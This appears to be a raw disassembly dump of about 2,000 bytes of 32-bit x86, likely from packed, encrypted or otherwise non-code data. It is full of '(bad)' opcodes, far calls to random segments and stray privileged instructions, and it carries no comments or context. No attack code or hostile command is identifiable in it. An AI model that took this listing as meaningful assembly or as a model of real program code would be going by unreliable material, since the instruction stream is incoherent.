  4084bb:	lods   al,BYTE PTR ds:[esi]
  4084bc:	iret   
  4084bd:	and    al,0x49
  4084bf:	and    al,0x32
  4084c1:	or     BYTE PTR [ecx+ecx*1+0x299a4c38],al
  4084c8:	jl     0x4084cf
  4084ca:	ins    DWORD PTR es:[edi],dx
  4084cb:	or     edi,DWORD PTR [esi-0x6a]
  4084ce:	mov    ch,0xa4
  4084d0:	xor    al,0xf8
  4084d2:	pop    edx
  4084d3:	(bad)  
  4084d4:	xchg   edi,eax
  4084d5:	icebp  
  4084d6:	add    al,BYTE PTR [ebx+0x14]
  4084d9:	cmc    
  4084da:	call   0x4629:0x9f75eee6
  4084e1:	enter  0xa41d,0x13
  4084e5:	jmp    0x40846f
  4084e7:	pop    ebx
  4084e8:	adc    ebp,0xf097607a
  4084ee:	xchg   eax,edi
  4084f0:	xlat   BYTE PTR ds:[ebx]
  4084f1:	ja     0x408497
  4084f3:	daa    
  4084f4:	ror    BYTE PTR [ebp+edi*8-0x44564058],1
  4084fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084fc:	es jbe 0x4084b9
  4084ff:	and    eax,0x9aa0a7f4
  408504:	mov    dl,0x10
  408506:	bswap  ecx
  408508:	in     eax,dx
  408509:	leave  
  40850a:	push   ds
  40850b:	sub    eax,0x41260447
  408510:	cmp    eax,0x4cd59f29
  408515:	mov    edx,esi
  408517:	mov    edi,0xa29a3a28
  40851c:	in     eax,dx
  40851d:	and    esi,ecx
  40851f:	add    DWORD PTR [ecx-0x6a],esp
  408522:	ret    0x58ff
  408525:	or     DWORD PTR [edx+0x30e09d47],ebx
  40852b:	ret    0x64b5
  40852e:	call   0xbbeb:0x13e85353
  408535:	rcl    BYTE PTR [esp+eiz*4],1
  408538:	out    dx,eax
  408539:	imul   esi,DWORD PTR [esi],0x124e3ec1
  40853f:	pop    ss
  408540:	xchg   edx,eax
  408541:	pop    ss
  408542:	call   0x8949:0xadcea5c6
  408549:	sub    al,0xa9
  40854b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40854c:	sub    eax,0xec9e9e9a
  408551:	ficom  WORD PTR ds:0xe3a4b253
  408557:	js     0x408547
  408559:	mov    bl,ch
  40855b:	das    
  40855c:	ret    0xe
  40855f:	mov    edx,0x4bbad364
  408564:	xchg   esi,eax
  408565:	add    eax,0xbd570a5
  40856a:	mov    cl,0xdb
  40856c:	js     0x4085c4
  40856e:	lods   al,BYTE PTR ds:[esi]
  40856f:	pop    ecx
  408570:	push   edi
  408571:	or     ebx,DWORD PTR [ebx-0x3b]
  408574:	shl    ecx,0x6f
  408577:	outs   dx,BYTE PTR ds:[esi]
  408578:	push   ebp
  408579:	outs   dx,DWORD PTR ds:[esi]
  40857a:	call   0x3eed:0xa758e53
  408581:	sbb    bl,BYTE PTR [ebp-0x7df4f3e9]
  408587:	inc    esp
  408588:	mov    edi,0xdb70b967
  40858d:	fstp   DWORD PTR [edx-0x53b96845]
  408593:	cmp    ebx,ebp
  408595:	pop    ebp
  408596:	and    bh,BYTE PTR [edi]
  408598:	repz pop ss
  40859a:	and    esp,esp
  40859c:	ss retf 
  40859e:	xor    BYTE PTR [edx],0x18
  4085a1:	cs call 0x7453888
  4085a7:	pop    ecx
  4085a8:	jge    0x4085b4
  4085aa:	lods   al,BYTE PTR ds:[esi]
  4085ab:	jmp    0x7afd:0xbe8c0b3c
  4085b2:	pop    edi
  4085b3:	aam    0x1d
  4085b5:	xchg   ebp,eax
  4085b6:	call   0x801a:0x96478a7c
  4085bd:	lea    ecx,[edi+0x6d5cba7]
  4085c3:	mov    cl,0xd8
  4085c5:	pop    esp
  4085c6:	je     0x408551
  4085c8:	mov    DWORD PTR [edx+ebx*4+0x4d],0xdb5be96a
  4085d0:	add    eax,0xb8a75c0d
  4085d5:	fadd   st,st(4)
  4085d7:	add    BYTE PTR [eax+0x60],cl
  4085da:	pop    edi
  4085db:	retf   0xf3b3
  4085de:	xchg   bl,dh
  4085e0:	dec    edi
  4085e1:	ret    0x1e69
  4085e4:	xchg   edx,eax
  4085e5:	sbb    al,0xf8
  4085e7:	mov    al,ds:0xe4818bd3
  4085ec:	stc    
  4085ed:	dec    ebx
  4085ee:	jmp    0x9afe6ed9
  4085f3:	jg     0x408607
  4085f5:	mov    bl,0x85
  4085f7:	mov    al,0xa6
  4085f9:	xchg   edx,ebp
  4085fb:	mov    al,0xaf
  4085fd:	sar    dh,cl
  4085ff:	mov    ch,0xed
  408601:	or     ebx,ebx
  408603:	inc    ebp
  408604:	cmp    ecx,esp
  408606:	cmp    al,0x78
  408608:	mov    ch,0x38
  40860a:	fimul  DWORD PTR [ebx-0x3f858d13]
  408610:	inc    eax
  408611:	test   BYTE PTR ds:0x7d85fda7,ah
  408617:	mov    ebp,0x8de97d1d
  40861c:	mov    gs,WORD PTR [edi+esi*2]
  40861f:	sub    eax,0x1b60cb92
  408624:	mov    dl,0xca
  408626:	xlat   BYTE PTR ds:[ebx]
  408627:	ds mov dl,cl
  40862a:	leave  
  40862b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40862c:	sub    ch,BYTE PTR [eax-0x238395f2]
  408632:	dec    esp
  408633:	fdiv   QWORD PTR [edx-0x615f9251]
  408639:	inc    eax
  40863a:	in     eax,0xdb
  40863c:	rcr    BYTE PTR [ebx+0x53c0a7bf],1
  408642:	jecxz  0x4086ba
  408644:	aam    0x31
  408646:	in     al,dx
  408647:	add    BYTE PTR [ebp+0x1c75474b],bh
  40864d:	mov    esi,DWORD PTR [ebp-0x45c75e8]
  408653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408654:	mov    edi,0xa0335399
  408659:	mov    dh,0xf
  40865b:	inc    edx
  40865c:	mov    dl,0xa6
  40865e:	in     al,dx
  40865f:	and    dl,bh
  408661:	aaa    
  408662:	pop    es
  408663:	xchg   ecx,eax
  408664:	adc    DWORD PTR [ebx],ecx
  408666:	xlat   BYTE PTR ds:[ebx]
  408667:	arpl   WORD PTR [eax-0x66],dx
  40866a:	ret    
  40866b:	stc    
  40866c:	jl     0x408688
  40866e:	mov    esp,cs
  408670:	xor    cl,BYTE PTR [esi-0x3c84ac66]
  408676:	ds push ds
  408678:	mov    DWORD PTR [edi],esi
  40867a:	dec    esp
  40867b:	cmp    al,0xb0
  40867d:	mov    BYTE PTR [ebp-0x252c8c61],ch
  408683:	stos   DWORD PTR es:[edi],eax
  408684:	pop    ds
  408685:	push   eax
  408686:	call   0x206a:0x4bb6cf5e
  40868d:	shl    WORD PTR [edi-0x73b656a6],1
  408694:	push   ebp
  408695:	les    esp,FWORD PTR [eax]
  408697:	cdq    
  408698:	mov    ch,0xdf
  40869a:	(bad)  [eax]
  40869c:	outs   dx,BYTE PTR ds:[esi]
  40869d:	and    al,0xba
  40869f:	adc    eax,0xa0a2a590
  4086a4:	stos   DWORD PTR es:[edi],eax
  4086a5:	or     DWORD PTR [eax+0x6b5b748f],esp
  4086ab:	cmp    DWORD PTR [esi-0x13],0xc68f549a
  4086b2:	ss (bad) 
  4086b5:	push   esp
  4086b6:	or     DWORD PTR [edi-0x514465b6],esp
  4086bc:	dec    edi
  4086bd:	outs   dx,DWORD PTR ds:[esi]
  4086be:	xchg   BYTE PTR [ecx-0x4e],cl
  4086c1:	dec    edi
  4086c2:	xor    edx,DWORD PTR [ebx-0xe]
  4086c5:	push   cs
  4086c6:	xor    al,0x52
  4086c8:	dec    ebp
  4086c9:	or     BYTE PTR [esi+eiz*4+0x53],ch
  4086cd:	jl     0x40868b
  4086cf:	cdq    
  4086d0:	xor    ch,al
  4086d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d3:	iret   
  4086d4:	mov    dl,0x89
  4086d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d7:	enter  0x821a,0xc7
  4086db:	aad    0x36
  4086dd:	or     edx,esp
  4086df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e0:	dec    ebx
  4086e1:	and    eax,0x9aaa77e1
  4086e6:	mov    eax,ds:0xae0afb8e
  4086eb:	hlt    
  4086ec:	dec    esp
  4086ed:	xor    dl,al
  4086ef:	imul   esi,DWORD PTR [edi+0xf],0xfb78bd72
  4086f6:	xchg   ebp,eax
  4086f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086f8:	mov    edx,0x333b9337
  4086fd:	add    DWORD PTR [edx],0x5c
  408700:	ss inc esi
  408702:	call   0x2fb2:0x7a4f0d35
  408709:	push   es
  40870a:	sbb    DWORD PTR [eax-0x54615232],esp
  408710:	scas   eax,DWORD PTR es:[edi]
  408711:	cmp    eax,DWORD PTR [eax-0x2d]
  408714:	test   eax,0xfbdc9db5
  408719:	retf   
  40871a:	cdq    
  40871b:	lods   al,BYTE PTR ds:[esi]
  40871c:	fmul   QWORD PTR [ebx]
  40871e:	in     al,0x8f
  408720:	(bad)  
  408721:	and    eax,0xd9a8a7cc
  408726:	and    eax,0x69652536
  40872b:	xchg   BYTE PTR [ebx+eax*4-0x4a7fa2fd],bh
  408732:	xchg   ebp,eax
  408733:	pop    edi
  408734:	(bad)  [ebx]
  408736:	das    
  408737:	add    al,0x0
  408739:	ins    DWORD PTR es:[edi],dx
  40873a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873b:	fsubr  DWORD PTR [edi+0x72c6d30b]
  408741:	xchg   esp,eax
  408742:	ss mov dl,0x33
  408745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408746:	call   0x5584:0x17fa4d45
  40874d:	add    ebx,ebp
  40874f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408750:	or     DWORD PTR [edi+ebp*2+0x3332087a],esp
  408757:	stos   BYTE PTR es:[edi],al
  408758:	scas   al,BYTE PTR es:[edi]
  408759:	shl    ah,0x29
  40875c:	jne    0x4086e5
  40875e:	mov    ecx,0x8392221e
  408763:	mov    al,0x68
  408765:	or     ebp,eax
  408767:	dec    ecx
  408768:	mov    esp,0x7c246321
  40876d:	int3   
  40876e:	call   0xebf3:0x2d9faf06
  408775:	or     al,0x7f
  408777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408778:	mov    bh,0x83
  40877a:	xchg   ebp,eax
  40877b:	in     eax,0xbf
  40877d:	dec    DWORD PTR [ecx-0x80]
  408780:	mov    dl,0xd9
  408782:	pop    edx
  408783:	adc    bh,BYTE PTR [eax-0xa3220bc]
  408789:	sbb    esi,esp
  40878b:	scas   eax,DWORD PTR es:[edi]
  40878c:	mov    ah,0x4
  40878e:	xor    BYTE PTR [ebp+0x17],bl
  408791:	test   BYTE PTR [esi+0x73328c27],al
  408797:	cmp    eax,0x58e4e6cd
  40879c:	mov    dl,0xbd
  40879e:	aad    0xf9
  4087a0:	mov    ah,0xf8
  4087a2:	or     eax,0xc70b14ef
  4087a7:	jno    0x4087fc
  4087a9:	ret    0xcb55
  4087ac:	push   edi
  4087ad:	outs   dx,DWORD PTR ds:[esi]
  4087ae:	call   0x3808:0x79449e74
  4087b5:	std    
  4087b6:	sbb    eax,0xbef550a8
  4087bb:	lahf   
  4087bc:	sar    BYTE PTR [ecx-0x39],cl
  4087bf:	arpl   WORD PTR [edx+esi*4-0x66],bx
  4087c3:	pop    ebp
  4087c4:	shr    dl,cl
  4087c6:	push   edx
  4087c7:	cmp    DWORD PTR [edi-0x264b6e7a],eax
  4087cd:	dec    edx
  4087ce:	leave  
  4087cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d0:	push   ecx
  4087d1:	or     dh,BYTE PTR ds:0x9b169814
  4087d7:	repz xor bh,ah
  4087da:	jmp    0x4087c1
  4087dc:	push   edi
  4087dd:	(bad)  
  4087df:	sub    dh,BYTE PTR [ebx]
  4087e1:	or     ecx,DWORD PTR [edx+esi*2+0x6d]
  4087e5:	sbb    eax,0xa503e74d
  4087ea:	call   0x91ff:0x8a1a9ce9
  4087f1:	pop    ebp
  4087f2:	cmp    esp,DWORD PTR [edi+0x69c9f21d]
  4087f8:	push   0x4d
  4087fa:	sbb    al,0xe6
  4087fc:	mov    ebp,0x4cd12f81
  408801:	and    eax,0x3b35678f
  408806:	mov    ecx,0x500b51d4
  40880b:	mov    ebx,0xc4f74e6e
  408810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408811:	gs call 0xf354:0xc11e0929
  408819:	mov    ah,0xa4
  40881b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40881c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881d:	inc    eax
  40881e:	sbb    esi,ecx
  408820:	sar    DWORD PTR [ebx-0x4d],0x79
  408824:	ret    0x9432
  408827:	fadd   DWORD PTR [esi+0x7867b055]
  40882d:	cmp    al,0x38
  40882f:	mov    esp,0xbe832b3
  408834:	xor    ch,BYTE PTR [edi]
  408836:	div    BYTE PTR [ebx-0x19d7edc4]
  40883c:	mov    cl,0xd8
  40883e:	pop    esi
  40883f:	imul   ecx,DWORD PTR [ecx+0x7b1fb71b],0x7b
  408846:	stos   BYTE PTR es:[edi],al
  408847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408848:	xchg   edx,eax
  408849:	mov    bl,0xbc
  40884b:	push   esp
  40884c:	rol    DWORD PTR [edi-0x7d],0x2d
  408850:	mov    cl,0x6c
  408852:	sbb    al,0x3b
  408854:	(bad)  
  408855:	rcl    eax,cl
  408857:	aaa    
  408858:	mov    ds:0xb6a7ffed,al
  40885d:	pop    eax
  40885e:	mov    ecx,DWORD PTR [eax-0x38776390]
  408864:	mov    dl,0xb9
  408866:	(bad)  
  408867:	call   0xc89:0xe72c8f19
  40886e:	push   edx
  40886f:	sub    al,0x96
  408871:	mov    cl,bl
  408873:	add    al,0x63
  408875:	push   edi
  408876:	or     dh,BYTE PTR [ebp+0x68]
  408879:	(bad)  
  40887a:	fwait
  40887b:	pop    es
  40887c:	sbb    BYTE PTR [edx],dh
  40887e:	bound  ecx,QWORD PTR [ebp+0x19522769]
  408884:	pop    ebx
  408885:	or     esi,edx
  408887:	pop    ss
  408888:	adc    eax,0xce92c843
  40888d:	xor    ebx,DWORD PTR [edx+0x6c6f6c16]
  408893:	je     0x40889b
  408895:	or     eax,0x10e1a76f
  40889a:	cdq    
  40889b:	or     al,0xa1
  40889d:	loop   0x408888
  40889f:	push   cs
  4088a0:	retf   
  4088a1:	xchg   esp,eax
  4088a2:	jl     0x40890a
  4088a4:	mov    dl,0x62
  4088a6:	lock pop ss
  4088a8:	or     BYTE PTR [edi+0x4b],al
  4088ab:	push   esp
  4088ac:	pop    ebp
  4088ad:	or     BYTE PTR [edi-0x2e],cl
  4088b0:	ds es dec edx
  4088b3:	fld    DWORD PTR [edx]
  4088b5:	stc    
  4088b6:	add    al,0x87
  4088b8:	enter  0x947b,0x4f
  4088bc:	(bad)  
  4088be:	shl    bh,1
  4088c0:	fs ja  0x408932
  4088c3:	gs push ebx
  4088c5:	punpckhdq mm7,QWORD PTR [ebx+eax*1]
  4088c9:	mov    BYTE PTR [ebx+0x187a0527],ch
  4088cf:	ins    BYTE PTR es:[edi],dx
  4088d0:	mov    cl,0xbc
  4088d2:	cs shl ecx,0x76
  4088d6:	jnp    0x4088ec
  4088d8:	jae    0x4088ac
  4088da:	fs sti 
  4088dc:	add    BYTE PTR [ebp-0x67],0xa0
  4088e0:	into   
  4088e1:	jnp    0x408950
  4088e3:	xor    al,0x12
  4088e5:	stos   DWORD PTR es:[edi],eax
  4088e6:	shl    DWORD PTR [eax+0x56],1
  4088e9:	jg     0x408885
  4088eb:	pop    esp
  4088ec:	cmc    
  4088ed:	xchg   al,bl
  4088ef:	sbb    BYTE PTR [ebx],0x1f
  4088f2:	push   ebx
  4088f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f4:	not    DWORD PTR [edx]
  4088f6:	(bad)  
  4088f8:	dec    eax
  4088f9:	mov    edx,0x64b2aa4e
  4088fe:	adc    BYTE PTR [edi+0x2e],dh
  408901:	pop    ss
  408902:	and    al,0x86
  408904:	add    al,0x9b
  408906:	pop    edi
  408907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408908:	out    0xef,al
  40890a:	inc    ebx
  40890b:	gs pop esi
  40890d:	pop    es
  40890e:	mov    ebp,0xe883ae6e
  408913:	enter  0x6032,0x45
  408917:	add    al,0x72
  408919:	pop    DWORD PTR [edi-0x5a]
  40891c:	and    eax,0x1dde6d9b
  408921:	dec    DWORD PTR [edi+0x43]
  408924:	dec    edi
  408925:	rcr    DWORD PTR [edx-0x5fdf1178],0x10
  40892c:	inc    ecx
  40892d:	lods   eax,DWORD PTR ds:[esi]
  40892e:	cdq    
  40892f:	test   eax,0x736b0628
  408934:	mov    dl,0x68
  408936:	and    ebp,DWORD PTR [edi+esi*4]
  408939:	nop
  40893a:	call   0xe6b0:0xa5007687
  408941:	add    DWORD PTR [eax-0x26],edi
  408944:	xchg   ebp,eax
  408945:	inc    edi
  408946:	adc    eax,0x9caaad6a
  40894b:	gs sub al,0x9d
  40894e:	sbb    eax,0x957af27f
  408953:	shl    BYTE PTR [edx-0x289734dd],cl
  408959:	pop    esp
  40895a:	stos   DWORD PTR es:[edi],eax
  40895b:	rol    ebp,1
  40895d:	or     eax,ebx
  40895f:	fdivr  st,st(4)
  408961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408962:	mov    al,ds:0x983b3828
  408967:	jg     0x4088fa
  408969:	mov    esp,0x6bc2171a
  40896e:	test   eax,0x890baa39
  408973:	push   esi
  408974:	inc    esi
  408975:	mov    dl,0xed
  408977:	dec    eax
  408978:	adc    ch,BYTE PTR [esi+0x58bec199]
  40897e:	dec    ebp
  40897f:	out    dx,al
  408980:	cmp    al,0xab
  408982:	lahf   
  408983:	cmp    BYTE PTR [eax],al
  408985:	or     dh,BYTE PTR [edi]
  408987:	mov    dl,BYTE PTR [edi+0x3d837d9c]
  40898d:	stc    
  40898e:	ficom  DWORD PTR [ecx+ebx*2]
  408991:	(bad)  
  408992:	call   0x2c2c:0x249b2a45
  408999:	xchg   edx,eax
  40899a:	fistp  WORD PTR [edi+0x4d05c8b4]
  4089a0:	out    dx,al
  4089a1:	retf   
  4089a2:	dec    esi
  4089a3:	(bad)  
  4089a4:	mov    eax,0xb2723e90
  4089a9:	fstp   QWORD PTR [edi+0x6cd5f19f]
  4089af:	cmp    edi,DWORD PTR [edx+esi*1+0x14]
  4089b3:	dec    ecx
  4089b4:	xor    dh,BYTE PTR [ebx+edx*8+0x62]
  4089b8:	xor    al,0xcc
  4089ba:	dec    ebx
  4089bb:	dec    edi
  4089bc:	mov    dl,0x66
  4089be:	paddusb mm0,QWORD PTR [eax+0x172f8e0]
  4089c5:	mov    ebx,0xa7dc9f51
  4089ca:	call   0xaf42:0xab60511c
  4089d1:	inc    esp
  4089d2:	cwde   
  4089d3:	imul   ecx,DWORD PTR [ecx+ecx*1+0x3a],0xffffff90
  4089d8:	(bad)  
  4089d9:	retf   
  4089da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089db:	mov    al,ah
  4089dd:	stos   DWORD PTR es:[edi],eax
  4089de:	and    DWORD PTR [esi+edx*2],ebx
  4089e1:	or     esi,DWORD PTR [ebx+0x6a]
  4089e4:	ret    
  4089e5:	mov    ds:0x580a115d,eax
  4089ea:	call   0x3f0a:0xd6ba8075
  4089f1:	cmp    eax,0x90caa725
  4089f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089f7:	lock imul edi,ecx,0x59af0885
  4089fe:	(bad)  
  4089ff:	nop
  408a00:	mov    dl,0x1c
  408a02:	push   es
  408a03:	test   BYTE PTR [esi],ah
  408a05:	vmwrite esp,DWORD PTR [edi+0x50175c01]
  408a0c:	in     al,dx
  408a0d:	aas    
  408a0e:	mov    esi,0xcacfb2d8
  408a13:	dec    edx
  408a14:	pop    ebx
  408a15:	xchg   DWORD PTR [eax+0x600ad4ad],ebp
  408a1b:	ret    0x269
  408a1e:	cwde   
  408a1f:	mov    BYTE PTR [edx+eax*8+0x23845f82],bh
  408a26:	test   BYTE PTR [edi],ch
  408a28:	pop    ecx
  408a29:	aam    0x5d
  408a2b:	retf   
  408a2c:	lds    esp,FWORD PTR [ebp-0x6]
  408a2f:	outs   dx,DWORD PTR ds:[esi]
  408a30:	xor    DWORD PTR [ebp+0x6d2fbb88],esp
  408a36:	adc    esp,DWORD PTR [eax+eax*1-0x27]
  408a3a:	cmp    dl,0x32
  408a3d:	xchg   ah,ch
  408a3f:	gs mov dl,0x85
  408a42:	fld    DWORD PTR [ecx-0x64]
  408a45:	cmc    
  408a46:	rol    ecx,cl
  408a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a49:	add    al,0x5a
  408a4b:	fbld   TBYTE PTR [eax]
  408a4d:	mov    al,0x1a
  408a4f:	cmp    eax,0x5577b3f0
  408a54:	mov    dl,0x8d
  408a56:	pop    ds
  408a57:	pop    ebx
  408a58:	push   ss
  408a59:	add    al,0xf0
  408a5b:	fdivr  st,st(7)
  408a5d:	loope  0x408aa5
  408a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a60:	je     0x408a81
  408a62:	sar    DWORD PTR [eax+0x7d],0x2f
  408a66:	js     0x408a91
  408a68:	mov    dl,0x82
  408a6a:	add    DWORD PTR [eax+edx*1+0x2d6b6086],esp
  408a71:	or     ebp,DWORD PTR [ebp-0x7a440315]
  408a77:	xor    ch,ch
  408a79:	ja     0x408a16
  408a7b:	out    0xbc,eax
  408a7d:	mov    WORD PTR [eax+0x6e700de5],?
  408a83:	jno    0x408ad4
  408a85:	or     esp,DWORD PTR [edx+0x2c6cb44f]
  408a8b:	xchg   ecx,eax
  408a8c:	stos   DWORD PTR es:[edi],eax
  408a8d:	push   es
  408a8e:	(bad)  
  408a8f:	aam    0x8c
  408a91:	cld    
  408a92:	call   0xf190:0xdab651e5
  408a99:	or     al,0x80
  408a9b:	pop    ecx
  408a9c:	ffree  st(0)
  408a9e:	add    DWORD PTR [ecx+esi*2],0xffffffc4
  408aa2:	push   0x24
  408aa4:	add    BYTE PTR [eax-0x5b],al
  408aa7:	jae    0x408a57
  408aa9:	mov    ah,BYTE PTR [edx-0x1e63179]
  408aaf:	xchg   esi,eax
  408ab0:	xchg   edx,eax
  408ab1:	or     DWORD PTR [edi+eiz*4],0x6a3270c0
  408ab8:	in     eax,0x2a
  408aba:	inc    edx
  408abb:	jmp    0xff40:0x3dcbd8b2
  408ac2:	sbb    dh,cl
  408ac4:	out    0x14,al
  408ac6:	ror    DWORD PTR [eax+0x631bcb15],1
  408acc:	aam    0x35
  408ace:	lds    esi,FWORD PTR [ecx]
  408ad0:	mov    dl,0xdd
  408ad2:	daa    
  408ad3:	test   ecx,ecx
  408ad5:	pop    ecx
  408ad6:	stc    
  408ad7:	mov    ecx,0x68670bdd
  408adc:	lock in al,dx
  408ade:	mov    DWORD PTR [esp+esi*2+0x6b],edi
  408ae2:	fwait
  408ae3:	(bad)  
  408ae4:	call   0x25183716
  408ae9:	push   cs
  408aea:	bound  eax,QWORD PTR [edi+0x1458157f]
  408af0:	in     eax,dx
  408af1:	test   BYTE PTR [ebx],ah
  408af3:	xchg   BYTE PTR [edx+0x115c7eb7],dl
  408af9:	pusha  
  408afa:	call   0x6c39:0x17c03434
  408b01:	and    DWORD PTR [ebx],eax
  408b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b04:	xchg   esi,eax
  408b05:	sub    esi,esi
  408b07:	aaa    
  408b08:	repnz out 0xd5,al
  408b0b:	jl     0x408b2f
  408b0d:	mov    al,0xd6
  408b0f:	and    al,0xb2
  408b11:	add    eax,0xf5471ab3
  408b16:	and    al,BYTE PTR [ecx]
  408b18:	push   ss
  408b19:	or     ebx,DWORD PTR [ebx-0x3f]
  408b1c:	frstor [eax+0x61f4a27e]
  408b22:	xchg   BYTE PTR [ecx-0x6b268fdf],dl
  408b28:	push   0x20
  408b2a:	in     eax,dx
  408b2b:	das    
  408b2c:	add    BYTE PTR [ebp-0x17],dl
  408b2f:	mov    edx,0xa765aebc
  408b34:	inc    ebx
  408b35:	(bad)  
  408b36:	pop    ecx
  408b37:	dec    ecx
  408b38:	sub    ecx,0x6c
  408b3b:	xchg   BYTE PTR [eax+ebp*4+0xb257629],bh
  408b42:	inc    ecx
  408b43:	fisttp QWORD PTR [ebx+0x32a75219]
  408b49:	outs   dx,DWORD PTR ds:[esi]
  408b4a:	retf   0x2997
  408b4d:	lods   eax,DWORD PTR ds:[esi]
  408b4e:	shl    DWORD PTR [edi-0x4c5e2d4b],cl
  408b54:	xor    dh,al
  408b56:	sbb    cl,BYTE PTR [eax-0x582d277b]
  408b5c:	cmp    esi,DWORD PTR [ebp+0x6541ab3d]
  408b62:	mov    WORD PTR [edx+esi*4+0x3f4e5aa],ds
  408b69:	push   eax
  408b6a:	inc    esi
  408b6b:	jge    0x408b69
  408b6d:	or     eax,edx
  408b6f:	cmp    esp,DWORD PTR [esi+0x7abd615a]
  408b75:	loope  0x408beb
  408b77:	aaa    
  408b78:	mov    cl,0x1b
  408b7a:	lds    esp,FWORD PTR [esi+0x573ee733]
  408b80:	jns    0x408bae
  408b82:	les    esp,FWORD PTR [edi+0x1dbb77af]
  408b88:	push   esp
  408b89:	sub    dh,al
  408b8b:	sub    ebp,DWORD PTR [edx]
  408b8d:	xor    DWORD PTR [edx-0xd2768cb],ebx
  408b93:	nop
  408b94:	ss mov bl,0xb1
  408b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b98:	bnd jge 0x408bc8
  408b9b:	pop    edx
  408b9c:	mov    DWORD PTR [ecx-0x654d8800],esp
  408ba2:	sti    
  408ba3:	jae    0x408bf3
  408ba5:	pop    ds
  408ba6:	xchg   DWORD PTR [ebx-0x8],edi
  408ba9:	or     BYTE PTR [ebx-0x31abf1e1],ah
  408baf:	mov    bh,0xa
  408bb1:	ret    
  408bb2:	enter  0xb28a,0x3a
  408bb6:	or     BYTE PTR [edi+ecx*2],cl
  408bb9:	adc    DWORD PTR [ecx],ebx
  408bbb:	add    BYTE PTR [ebp+0xb],al
  408bbe:	dec    eax
  408bbf:	in     al,0x4c
  408bc1:	mov    eax,0x968c7446
  408bc6:	call   0x9407:0x3b189ed1
  408bcd:	mov    al,0x8c
  408bcf:	cdq    
  408bd0:	std    
  408bd1:	and    BYTE PTR [edx-0x59f0c003],bl
  408bd7:	sti    
  408bd8:	sub    esp,0xb482e29a
  408bde:	jo     0x408bd0
  408be0:	jns    0x408c15
  408be2:	xlat   BYTE PTR ds:[ebx]
  408be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be4:	xchg   ebx,eax
  408be5:	sahf   
  408be6:	pop    es
  408be7:	fcmovnbe st,st(0)
  408be9:	and    DWORD PTR [eax],edx
  408beb:	xchg   ebp,eax
  408bec:	mov    dl,0xc1
  408bee:	int3   
  408bef:	cmp    esp,DWORD PTR [ecx]
  408bf1:	push   ecx
  408bf2:	cli    
  408bf3:	xorps  xmm0,XMMWORD PTR ds:0x5541ae71
  408bfa:	cmc    
  408bfb:	mov    esi,0x80655e95
  408c00:	into   
  408c01:	stos   DWORD PTR es:[edi],eax
  408c02:	daa    
  408c03:	jnp    0x408bc5
  408c05:	das    
  408c06:	call   0x4b45:0x9b2c4462
  408c0d:	inc    ebx
  408c0e:	mov    BYTE PTR [edi-0x6c923bdd],ah
  408c14:	ret    0xd800
  408c17:	in     al,dx
  408c18:	inc    edx
  408c19:	sbb    eax,0xdbc77c9a
  408c1e:	aaa    
  408c1f:	fs int 0x24
  408c22:	call   0xc79c5dd0
  408c27:	mov    ebx,0xf620b6d2
  408c2c:	adc    al,0x4d
  408c2e:	call   0x9953:0xa8c13e43
  408c35:	pop    ds
  408c36:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c38:	lock js 0x408bdd
  408c3b:	mov    esp,0x83740755
  408c40:	mov    ecx,0x42eb04a6
  408c45:	or     ebx,DWORD PTR [ebx-0x8]
  408c48:	cmp    BYTE PTR [edx-0x3055be4],ch
  408c4e:	adc    BYTE PTR [ebx-0x19],0xa9
  408c52:	adc    eax,0xa85cee30
  408c57:	mov    ah,0x7a
  408c59:	xchg   edx,eax
  408c5a:	dec    edx
  408c5b:	dec    ebp
  408c5c:	xor    BYTE PTR [eax-0x1d],al
  408c5f:	adc    esi,DWORD PTR [edx-0x3d3b66b5]
  408c65:	test   BYTE PTR [edx],ah
  408c67:	mov    esi,0x87570b19
  408c6c:	in     al,0xc1
  408c6e:	sub    al,0x3
  408c70:	imul   ecx,DWORD PTR [edx+esi*2],0x7d
  408c74:	lods   al,BYTE PTR ds:[esi]
  408c75:	jo     0x408ca5
  408c77:	dec    ebp
  408c78:	outs   dx,DWORD PTR ds:[esi]
  408c79:	xlat   BYTE PTR ds:[ebx]
  408c7a:	call   0xeb4f:0xf9e9e822
  408c81:	cmp    edx,DWORD PTR [ecx+0x38be08ed]
  408c87:	ss mov dl,0xe
  408c8a:	iret   
  408c8b:	xor    al,0x75
  408c8d:	mov    dl,0x36
  408c8f:	aaa    
  408c90:	sub    al,0x72
  408c92:	test   DWORD PTR [edi+0x3fd9ec1],esp
  408c98:	xor    DWORD PTR [ebx+ecx*8-0x119a4d81],0x593c8eed
  408ca3:	cld    
  408ca4:	int    0x4
  408ca6:	dec    eax
  408ca7:	xor    DWORD PTR [edi],esi
  408ca9:	xlat   BYTE PTR ds:[ebx]
  408caa:	mov    WORD PTR [edx+0x276ff5bd],fs
